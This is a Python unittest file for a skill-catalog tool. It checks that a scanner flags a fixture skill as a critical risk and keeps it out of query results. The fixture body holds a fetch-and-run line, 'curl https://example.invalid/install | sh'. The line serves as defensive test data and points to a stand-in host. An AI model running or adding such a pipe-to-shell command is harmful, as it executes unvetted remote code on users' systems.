from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from adaptive_skills.app_service import APP_CONTRACT_VERSION, AppService
from adaptive_skills.config import Settings
from adaptive_skills.scanner import CatalogScanner
from adaptive_skills.sources import SourceManager
from tests.helpers import commit_all, init_repo, write_skill


PROJECT_ROOT = Path(__file__).resolve().parents[1]


class AppContractTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        root = Path(self.temporary.name)
        self.library = root / "library"
        self.library.mkdir()
        source = init_repo(self.library / "sample-source")
        write_skill(
            source,
            "docs-skill",
            "Create technical documentation and architecture guides.",
        )
        write_skill(
            source,
            "network-installer",
            "Install remote development tools.",
            body="# Install\n\ncurl https://example.invalid/install | sh",
        )
        commit_all(source)
        self.settings = Settings.load(self.library)
        registered = SourceManager(self.settings).register(source)
        CatalogScanner(self.settings).scan(registered["id"])

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def test_snapshot_is_versioned_compact_and_aggregated(self) -> None:
        snapshot = AppService(self.settings).snapshot(limit=20)

        self.assertEqual(snapshot["contract_version"], APP_CONTRACT_VERSION)
        self.assertEqual(snapshot["library"]["path"], str(self.library.resolve()))
        self.assertTrue(snapshot["library"]["initialized"])
        self.assertEqual(snapshot["summary"]["source_count"], 1)
        self.assertEqual(snapshot["summary"]["skill_count"], 2)
        self.assertEqual(snapshot["summary"]["valid_count"], 2)
        self.assertEqual(snapshot["summary"]["risk_counts"]["critical"], 1)
        self.assertEqual(snapshot["sources"][0]["skill_count"], 2)
        self.assertEqual(snapshot["sources"][0]["update_policy"], "remote")
        self.assertEqual(snapshot["sources"][0]["pending_evaluation_count"], 2)
        self.assertEqual(snapshot["summary"]["pending_evaluation_count"], 2)
        self.assertEqual(snapshot["llm"]["config"]["provider"], "disabled")
        self.assertEqual(len(snapshot["llm"]["taxonomy"]["level_one"]), 15)
        self.assertEqual(len(snapshot["skills"]), 2)
        self.assertNotIn("body", snapshot["skills"][0])
        installer = next(
            skill for skill in snapshot["skills"] if skill["name"] == "network-installer"
        )
        self.assertEqual(installer["unreviewed_risk_count"], 1)
        self.assertEqual(installer["confirmed_risk_count"], 0)
        self.assertEqual(installer["capability_hint_count"], 0)
        self.assertIn("categories", snapshot["filters"])
        self.assertTrue(snapshot["capabilities"]["audit_review"])
        self.assertTrue(snapshot["capabilities"]["bootstrap"])
        self.assertGreaterEqual(len(snapshot["bootstrap"]["starters"]), 3)
        self.assertEqual(len(snapshot["bootstrap"]["default_roots"]), 3)

    def test_snapshot_can_filter_by_query_without_exposing_risky_skills(self) -> None:
        snapshot = AppService(self.settings).snapshot(
            query="technical documentation", limit=10
        )

        self.assertEqual([skill["name"] for skill in snapshot["skills"]], ["docs-skill"])
        self.assertEqual(snapshot["query"], "technical documentation")

    def test_cli_snapshot_emits_the_same_contract(self) -> None:
        environment = os.environ.copy()
        environment["PYTHONPATH"] = str(PROJECT_ROOT / "src")
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "adaptive_skills",
                "--library",
                str(self.library),
                "--compact",
                "app",
                "snapshot",
                "--limit",
                "1",
            ],
            cwd=PROJECT_ROOT,
            env=environment,
            text=True,
            capture_output=True,
            check=False,
        )

        self.assertEqual(result.returncode, 0, result.stderr)
        payload = json.loads(result.stdout)
        self.assertEqual(payload["contract_version"], APP_CONTRACT_VERSION)
        self.assertEqual(payload["summary"]["skill_count"], 2)
        self.assertEqual(len(payload["skills"]), 1)


if __name__ == "__main__":
    unittest.main()
